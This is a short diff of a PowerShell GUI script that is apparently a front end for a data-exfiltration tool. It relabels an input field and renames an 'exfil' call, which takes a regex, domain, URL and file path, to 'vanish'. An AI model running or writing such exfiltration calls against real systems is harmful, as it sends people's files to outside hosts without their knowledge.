@@ -15,7 +15,7 @@ $form.ForeColor = [System.Drawing.Color]::White
 
 # Create 'regex' input field
 $regexLabel = New-Object System.Windows.Forms.Label
-$regexLabel.Text = 'Regex:'
+$regexLabel.Text = 'File ID:'
 $regexLabel.Location = New-Object System.Drawing.Point(10, 20)
 $regexLabel.Size = New-Object System.Drawing.Size(280, 20)
 $regexLabel.ForeColor = [System.Drawing.Color]::White
@@ -92,7 +92,7 @@ $executeButton.Add_Click({
 
     # Example: Output the values
     #[System.Windows.Forms.MessageBox]::Show("Regex: $regex`nDomain: $domain`nURL: $url`nFile Path: $filePath")
-    exfil -regex "$regex" -domain "$domain" -url "$url" -filepath $filepath
+    vanish -regex "$regex" -domain "$domain" -url "$url" -filepath $filepath
 })
 
 # Create 'InteractSh Web Client' button
